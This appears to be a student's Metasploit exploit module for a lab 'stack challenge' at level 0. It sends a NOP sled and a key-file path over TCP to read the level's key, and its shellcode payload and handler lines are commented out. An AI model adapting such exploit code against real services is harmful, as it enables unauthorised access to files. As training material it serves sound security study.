##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'stack challenges exploit level 0',
			'Description'    => %q{Whatever},
			'Author'         => 'Student',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 0 $',
			'References'     =>
				[
				],
			'DefaultOptions' =>
				{
				},
			'Payload'        =>
				{
					'Space' => 1024,
					'BadChars' => "\x00\x0A",
				},
			'Platform'       => 'linux',
			'Targets'        =>
				[
						[ 'Linux 2.6.21.5',{ 'Ret' => 0x00000000 } ],
				],
			'DefaultTarget' => 0))
		register_options([Opt::RPORT(12345)], self.class)
	end

	def exploit
		sploit = "\x90" * 128
		sploit << "var/levels/level0/key\x00"
		sploit << "\n" #for scanf
		print_status("Trying target #{target.name}...")
		connect
				sock.put(sploit)
		res = sock.get
				#sock.put(payload.encoded)
				#sleep(10)
				#handler()
		disconnect
				print_status("Response: '" + res +"'");

	end

end
